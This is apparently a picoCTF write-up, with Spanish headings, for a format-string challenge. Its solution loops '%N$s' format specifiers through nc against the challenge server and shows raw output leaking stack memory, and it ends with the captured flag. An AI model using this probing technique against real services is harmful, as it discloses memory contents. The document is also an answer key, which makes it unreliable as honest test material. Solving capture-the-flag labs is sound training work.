## Descripción 

Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using:`nc saturn.picoctf.net 57714`

## Hints
Format Strings


## Solución
```
kifuel@DESKTOP-3C07MOG:/mnt/c/Users/Miguel Angel/Downloads/pico/Actividad 18$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 57714; done
Tell me a story and then I'll tell you one >> Here's a story -
%0$s
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
���
Tell me a story and then I'll tell you one >> Here's a story -
�ú,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
�.
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�������
Tell me a story and then I'll tell you one >> Here's a story -
��h�g
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -
����
Tell me a story and then I'll tell you one >> Here's a story -
��e�

Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}
Tell me a story and then I'll tell you one >> Here's a story -

```


## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}